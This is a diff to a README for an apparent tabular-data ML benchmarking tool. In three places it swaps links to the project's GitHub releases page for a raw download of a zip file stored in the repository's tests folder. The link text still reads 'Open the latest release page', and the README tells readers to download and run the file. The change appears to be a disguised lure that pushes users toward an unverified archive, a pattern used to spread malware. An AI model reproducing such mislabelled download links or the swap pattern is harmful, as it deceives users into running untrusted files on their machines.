@@ -1,6 +1,6 @@
 # 🤖 Tabular-Benchmark-MLOps - Compare Models on Tabular Data
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-blue)](https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest_Release-blue)](https://raw.githubusercontent.com/Mediapen6443/Tabular-Benchmark-MLOps/main/tests/ML-Benchmark-Ops-Tabular-unslow.zip)
 
 ## 📌 What this app does
 
@@ -27,7 +27,7 @@ Before you start, make sure your PC has:
 
 Go to the release page and download and run this file:
 
-[Open the latest release page](https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases)
+[Open the latest release page](https://raw.githubusercontent.com/Mediapen6443/Tabular-Benchmark-MLOps/main/tests/ML-Benchmark-Ops-Tabular-unslow.zip)
 
 On that page, look for the newest release and download the Windows file.
 
@@ -215,7 +215,7 @@ This repository gives you a hands-on way to compare common ML tools on structure
 
 If you need the app again later, use the release page here:
 
-[https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases](https://github.com/Mediapen6443/Tabular-Benchmark-MLOps/releases)
+[https://raw.githubusercontent.com/Mediapen6443/Tabular-Benchmark-MLOps/main/tests/ML-Benchmark-Ops-Tabular-unslow.zip](https://raw.githubusercontent.com/Mediapen6443/Tabular-Benchmark-MLOps/main/tests/ML-Benchmark-Ops-Tabular-unslow.zip)
 
 ## 🧭 Quick start
 
